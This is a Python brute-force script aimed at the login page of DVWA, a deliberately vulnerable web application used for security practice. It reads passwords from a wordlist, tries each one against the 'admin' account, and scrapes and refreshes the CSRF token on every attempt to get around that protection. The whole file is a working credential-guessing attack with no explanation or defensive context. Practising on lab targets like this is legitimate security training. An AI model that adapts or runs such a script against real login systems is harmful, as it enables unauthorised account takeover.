from sys import argv
import requests
from bs4 import BeautifulSoup as Soup

script, filename, success_message = argv
txt = open(filename)

url = 'http://dvwa.local/vulnerabilities/brute/'
cookie = {'security': 'high', 'PHPSESSID':'kjrkqb382512vao219va7sk0s4'}
s = requests.Session()
target_page = s.get(url, cookies=cookie)

''' 
checkSuccess
@param: html (String)

Searches the response HTML for our specified success message
'''
def checkSuccess(html):
 soup = Soup(html)
 search = soup.findAll(text=success_message)
 
 if not search:
  success = False

 else:
  success = True

 return success

page_source = target_page.text
soup = Soup(page_source)
csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value')

print ('DVWA_URL' + url)
print ('CSRF_Token='+ csrf_token)

with open(filename) as f:
 print ('Running brute force attack...')
 for password in f:
 
  print ('password tryed: ' + password)
  password = password.strip()

  payload = {'username': 'admin', 'password': password, 'Login': 'Login', 'user_token': csrf_token}
  r = s.get(url, cookies=cookie, params=payload)
  success = checkSuccess(r.text)

  if not success:
   soup = Soup(r.text)
   csrf_token = soup.findAll(attrs={"name": "user_token"})[0].get('value')
  else:
   print ('Password is: ' + password)
   break

 if not success:
  print('Brute force failed. No matches found.')